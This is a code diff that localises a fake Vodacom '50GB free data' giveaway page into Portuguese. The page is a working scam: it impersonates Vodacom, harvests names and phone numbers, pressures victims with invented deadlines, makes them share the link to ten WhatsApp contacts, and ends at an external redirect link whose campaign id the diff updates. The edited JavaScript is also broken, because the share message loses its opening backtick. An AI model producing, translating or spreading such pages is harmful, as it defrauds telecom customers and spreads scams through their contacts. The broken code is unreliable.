@@ -432,29 +432,29 @@
         <!-- === Page 3: User Input Form === -->
         <div id="page-3" class="page-content">
             <h2 class="text-center text-danger fw-bold mb-4 text-2xl">Formulário de Registo de Reivindicação</h2>
-            <p class="text-center text-muted mb-4">Final step: Enter your details to activate your 50GB data bundle.</p>
+            <p class="text-center text-muted mb-4">Passo final: Insira os seus dados para ativar o pacote de 50GB de dados.</p>
             
             <form id="details-form" class="p-4 border border-gray-300 rounded-xl shadow-md bg-white">
                 <div class="mb-4">
-                    <label for="userName" class="form-label fw-semibold">Full Name:</label>
+                    <label for="userName" class="form-label fw-semibold">Nome Completo:</label>
                     <input type="text" class="form-control p-3 rounded-lg" id="userName" placeholder="e.g., Thabo Mbeki" required>
                 </div>
                 <div class="mb-4">
-                    <label for="userPhone" class="form-label fw-semibold">Vodacom Phone Number:</label>
+                    <label for="userPhone" class="form-label fw-semibold">Número de Telefone Vodacom:</label>
                     <input type="tel" class="form-control p-3 rounded-lg" id="userPhone" pattern="[0-9]{10,12}" placeholder="e.g., 0712345678" required>
-                    <div class="form-text text-danger fw-bold">This number must be active on Vodacom to receive the data!</div>
+                    <div class="form-text text-danger fw-bold">Este número deve estar ativo na Vodacom para receber os dados!</div>
                 </div>
                 <div class="mb-5">
-                    <label for="dataAmount" class="form-label fw-semibold">Data Amount to Claim (50GB Max):</label>
+                    <label for="dataAmount" class="form-label fw-semibold">Quantidade de Dados a Reivindicar (Máx. 50GB):</label>
                     <select class="form-select p-3 rounded-lg" id="dataAmount" required>
-                        <option value="">Select Data Bundle Size...</option>
+                        <option value="">Escolha o Pacote de Dados..</option>
                         <option value="5GB">5 GB</option>
                         <option value="10GB">10 GB</option>
                         <option value="25GB">25 GB</option>
-                        <option value="50GB" selected>50 GB (Recommended & FREE)</option>
+                        <option value="50GB" selected>50 GB (Recomendado e GRÁTIS)</option>
                     </select>
                 </div>
-                <button type="submit" class="btn btn-danger w-100 fw-bold py-3 text-xl rounded-full bg-red-700 hover:bg-red-800 transition">VADILATE DATA</button>
+                <button type="submit" class="btn btn-danger w-100 fw-bold py-3 text-xl rounded-full bg-red-700 hover:bg-red-800 transition">VALIDAR DADOS</button>
             </form>
         </div>
 
@@ -464,38 +464,36 @@
             
                 
              <img id="dance-image"  src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbV0J3xDOxLAdWEQ4kLaUhdF1AJPnnrC7cG14z7Ythq_aBHMUzrjXs7Q-YLBkUM8yWjgkxOP1ghAFUyTHIdSt9CqSetPN4fUwNOM9362EMU1icFNk0vsUWq0Hkg3s8h4OTprbm1tpGGIhMjr7jUuCNlhn08KXafVRBUFBCXrdjnU8OFUTI01vkYMlbtxk/s320/360_F_280016442_I5DcWCRT7JTr5Ut86a9VvqNoOfDt854G-removebg-preview__1_-removebg-preview.png" class="w-2/3 mx-auto mb-4" alt="Celebration Image"><br>
-            <h2 class="text-center text-warning fw-bold mb-4 text-3xl">🎉 Congratulations, <span id="display-name" class="text-danger"></span>!</h2>
+            <h2 class="text-center text-warning fw-bold mb-4 text-3xl">🎉 Parabéns, <span id="display-name" class="text-danger"></span>!</h2>
             
             <div class="alert alert-success p-4 rounded-xl shadow-lg border-4 border-green-500 bg-green-50">
                 <p class="lead fw-semibold mb-3">
-                    Your phone number (<span id="display-phone" class="fw-bolder text-xl"></span>) is eligible to receive a massive <span class="text-danger fw-bolder">50 GB Data Giveaway</span> from Vodacom Valid for 3 Months!
+                   O seu número de telefone (<span id="display-phone" class="fw-bolder text-xl"></span>) está elegível para receber um pacote enorme <span class="text-danger fw-bolder">Oferta de 50GB de Dados</span> da Vodacom, válido por 3 meses!
                 </p>
                 <p class="mb-0 fw-bold">
-                    We just need one final anti-bot verification step to process the data activation.
+                   Só precisamos de uma última verificação anti-bot para processar a ativação dos dados. For
                 </p>
             </div>
 
             <div class="mt-5">
                <button onclick="goToStep(5)" class="get-yours-btn btn w-full text-white">
-                 CONTINUE
+                CONTINUAR
                 </button> 
             </div>
         </div>
 
         <!-- === Page 5: Forced Share Loop === -->
         <div id="page-5" class="page-content text-center">
-            <h2 class="text-danger fw-bold mb-4 text-2xl">⚠️ FINAL STEP: VERIFY & CLAIM ⚠️</h2>
+            <h2 class="text-danger fw-bold mb-4 text-2xl">⚠️ PASSO FINAL: VERIFICAR & REIVINDICAR ⚠️</h2>
             <p class="lead mb-4 text-dark font-semibold">
-               To get your free 50GB data, click the button below and share this information with 10 groups or 10 friends on WhatsApp
-
-Let              us celebrate together. Invite Your loved Ones to benefit also.
+               Para obter os seus 50GB de dados grátis, clique no botão abaixo e partilhe esta informação com 10 grupos ou 10 amigos no WhatsApp. Vamos celebrar juntos! Convide também os seus entes queridos para aproveitarem.
             </p>
             <p class="text-muted mb-5">
-                After sharing, your progress bar will complete, and your 50GB data will be activated within 15 minutes.
+                Após partilhar, a sua barra de progresso será concluída e os seus 50GB de dados serão ativados em até 15 minutos.
             </p>
             
             <div class="mb-4 border p-3 rounded-lg bg-yellow-100">
-                <span id="share-count" class="h1 fw-bolder text-info">0</span> / 10 SHARES COMPLETED
+                <span id="share-count" class="h1 fw-bolder text-info">0</span> / 10 PARTILHAS CONCLUÍDAS
             </div>
 
             <!-- Progress Bar -->
@@ -505,17 +503,17 @@ Let              us celebrate together. Invite Your loved Ones to benefit also.
                 <span class="fw-bold text-lg">0%</span>
               </div>
             </div> 
-            <center><p>Share until the blue Bar is filled</p></center><br>
+            <center><p>Partilhe até que a barra azul esteja completa</p></center><br>
 
             <!-- Share Button (Simulated Clicks) -->
             <button onclick="simulateShare()" class="whatsapp-btn btn btn-lg bg-green-500 hover:bg-green-600 w-full fw-bold py-3 shadow-lg text-white border-2 border-green-700" id="share-button">
                 <svg class="me-3 inline-block" width="28" height="28" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                     <path d="M12.0003 2.00003C6.48633 2.00003 2.00033 6.48603 2.00033 12.0001C2.00033 13.9861 2.58333 15.8651 3.56833 17.4421L2.24733 21.7531L6.68933 20.3551C8.25333 21.3191 10.0833 21.8751 12.0003 21.8751C17.5143 21.8751 22.0003 17.3891 22.0003 12.0001C22.0003 6.48603 17.5143 2.00003 12.0003 2.00003ZM17.1523 15.4411C16.9043 15.8971 14.3633 17.2001 14.0753 17.3521C13.8113 17.4951 13.5653 17.5171 13.1113 17.3621C12.6593 17.2081 11.2183 16.7901 9.54133 15.3521C8.21433 14.2381 7.31933 12.6841 7.07333 12.2661C6.82733 11.8471 7.21833 11.6961 7.46233 11.4551C7.68033 11.2401 7.91033 10.9351 8.16433 10.6301C8.42033 10.3241 8.52733 10.2741 8.70433 10.2761C8.86833 10.2781 9.04033 10.2971 9.18433 10.6021C9.33033 10.9081 9.69533 11.8231 9.77233 11.9841C9.84933 12.1461 9.97233 12.3391 9.87533 12.5531C9.77833 12.7661 9.51033 13.0451 9.38733 13.1971C9.26333 13.3501 9.15533 13.4321 9.31733 13.7221C9.48033 14.0121 10.0383 14.9271 10.9663 15.7501C11.6663 16.3761 12.2473 16.5701 12.5933 16.6901C12.9403 16.8111 13.1363 16.7931 13.3763 16.5981C13.6143 16.4041 14.1973 15.8201 14.3923 15.5891C14.5883 15.3581 14.7433 15.4221 15.0133 15.5341C15.2843 15.6471 16.7163 16.3571 17.0163 16.5051C17.3163 16.6541 17.5093 16.6401 17.6053 16.4881C17.7023 16.3351 17.7023 15.8851 17.6363 15.7721C17.5703 15.6591 17.3513 15.3781 17.1523 15.0881Z" fill="#FFF"/>
                 </svg>
-                SHARE TO FRIENDS 
+                PARTILHAR COM AMIGOS
             </button>
 
-            <p class="text-muted small mt-3">Clicking the button will open WhatsApp. Return here after sharing to continue.</p>
+            <p class="text-muted small mt-3">Ao clicar no botão, o WhatsApp será aberto. Volte aqui depois de partilhar para continuar.</p>
         </div>
 
         <!-- === Page 6: Final Prize Confirmation === -->
@@ -524,21 +522,21 @@ Let              us celebrate together. Invite Your loved Ones to benefit also.
                 <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.429 10.31a.75.75 0 0 0-.018 1.054l2.455 2.5a.75.75 0 0 0 1.096-.002l3.414-3.414a.75.75 0 0 0-.001-1.06Z"/>
             </svg></center>
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbV0J3xDOxLAdWEQ4kLaUhdF1AJPnnrC7cG14z7Ythq_aBHMUzrjXs7Q-YLBkUM8yWjgkxOP1ghAFUyTHIdSt9CqSetPN4fUwNOM9362EMU1icFNk0vsUWq0Hkg3s8h4OTprbm1tpGGIhMjr7jUuCNlhn08KXafVRBUFBCXrdjnU8OFUTI01vkYMlbtxk/s320/360_F_280016442_I5DcWCRT7JTr5Ut86a9VvqNoOfDt854G-removebg-preview__1_-removebg-preview.png" class="w-2/3 mx-auto mb-4" alt="Final Reward Image"><br>
-            <h2 class="text-3xl fw-bold text-success mb-4">CONGRATULATIONS!</h2>
+            <h2 class="text-3xl fw-bold text-success mb-4">🎉 PARABÉNS!</h2>
             
             <p class="lead fw-semibold text-dark mb-4 p-3 bg-green-100 rounded-lg">
-                Your verification is complete. You are officially qualified for the 50GB data giveaway from Vodacom!
+                A sua verificação está completa. Você está oficialmente qualificado para a oferta de 50GB de dados da Vodacom!
             </p> 
             
             <div class="alert alert-warning p-4 rounded-xl shadow-lg border-4 border-yellow-500">
-                 <p class="mb-0 fw-bold text-xl text-red-600">FINAL STEP:</p>
-                 <p class="mb-0">Click the button below to secure your 50GB data on your account immediately!</p>
+                 <p class="mb-0 fw-bold text-xl text-red-600">PASSO FINAL:</p>
+                 <p class="mb-0">Clique no botão abaixo para garantir os seus 50GB de dados na sua conta imediatamente!</p>
             </div>
             
             <!-- Final Button (Links to external site) -->
             <div class="mt-5">
-                <a id="final-link" href="https://otieu.com/4/9048439" target="_blank" class="get-yours-btn btn w-full text-white animate-none hover:animate-none">
-                 ACTIVATE DATA NOW
+                <a id="final-link" href="https://otieu.com/4/10328966" target="_blank" class="get-yours-btn btn w-full text-white animate-none hover:animate-none">
+                ATIVAR DADOS AGORA
                 </a>
             </div>
         </div>
@@ -565,7 +563,7 @@ Let              us celebrate together. Invite Your loved Ones to benefit also.
                 <!-- Announcement Text -->
                 <center><span class="fs-5 text-nowrap">
                     <i class="bi bi-bell-fill text-warning me-2"></i> 
-                    WEBSITE DISCLAIMER🔻
+                   AVISO LEGAL DO SITE🔻
                 </span></center>
                 
                 <!-- Bootstrap Icon for the Arrow (Starts as Down) -->
@@ -578,20 +576,20 @@ Let              us celebrate together. Invite Your loved Ones to benefit also.
                     
                     <!-- Header Section -->
                     <div class="card-header bg-danger text-white fw-bold h5 mb-0 py-2 rounded-top-2">
-                        🎉 VODACOM EXCLUSIVE OFFER 🎉
+                        🎉 OFERTA EXCLUSIVA VODACOM 🎉
                     </div>
                     
                     <!-- Card Body Content -->
                     <div class="card-body bg-secondary p-5">  
-                        <h5 class="card-title text-white mb-3 fw-normal">As a valued customer, you qualify for our biggest data gift:</h5>
+                        <h5 class="card-title text-white mb-3 fw-normal">Como cliente valorizado, você está qualificado para o nosso maior presente de dados:</h5>
                         
                         <!-- Main Announcement Highlight -->
                         <div class="text-danger display-4 fw-bolder mb-4">
-                            FREE 50GB DATA!
+                           50GB DE DADOS GRÁTIS!
                         </div>
                         
                         <p class="card-text lead text-white fw-bold text-2xl mb-4">
-                            This is a limited-time flash giveaway and must be redeemed within the next 24 hours to secure your massive data bundle.
+                           Esta é uma oferta relâmpago por tempo limitado e deve ser resgatada nas próximas 24 horas para garantir o seu pacote de dados enorme.
                         </p>
                         
                        <center><img 
@@ -602,7 +600,7 @@ Let              us celebrate together. Invite Your loved Ones to benefit also.
 
                         <!-- Footer Section -->
 <div class="card-footer text-muted bg-light border-0 py-2">
-<small>Offer valid while stocks last. Standard Ts & Cs apply.</small>
+<small>Oferta válida enquanto durarem os estoques. Aplicam-se os Termos e Condições padrão.</small>
     <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1724942,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
@@ -750,7 +748,7 @@ Let              us celebrate together. Invite Your loved Ones to benefit also.
 
         // 1. Construct the Share message and open WhatsApp
         const message = encodeURIComponent(
-            `Vodacom is launching the Big Data Boost to reward our loyal customers with an incredible 50GB of FREE data Giveaway! This limited-time offer helps every citizen stay connected during the current climate, allowing you to stream, work, and learn without worry. Don't miss out on this huge data top-up—it's Vodacom's way of giving back. Claim your 50GB free data now and make sure to register correctly 👉 ${window.location.href}`
+           A Vodacom está lançando o Big Data Boost para recompensar os nossos clientes fiéis com um incrível presente de 50GB de dados GRÁTIS! Esta oferta por tempo limitado ajuda todos a se manterem conectados durante o período atual, permitindo que você faça streaming, trabalhe e aprenda sem preocupações. Não perca este enorme bônus de dados — é a forma da Vodacom de retribuir. Reivindique os seus 50GB de dados grátis agora e certifique-se de se registrar corretamente. 👉 ${window.location.href}`
         );
 
         
